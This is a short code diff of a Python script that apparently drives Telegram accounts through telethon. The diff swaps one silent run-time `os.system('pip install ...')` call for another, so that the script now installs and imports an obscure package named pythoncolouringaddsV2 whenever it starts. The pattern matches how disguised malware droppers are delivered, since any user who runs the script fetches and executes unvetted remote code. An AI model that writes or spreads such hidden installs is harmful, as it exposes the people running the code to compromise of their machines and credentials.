@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloradds")
-import pipcoloradds
+os.system("pip install pythoncolouringaddsV2")
+import pythoncolouringaddsV2
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
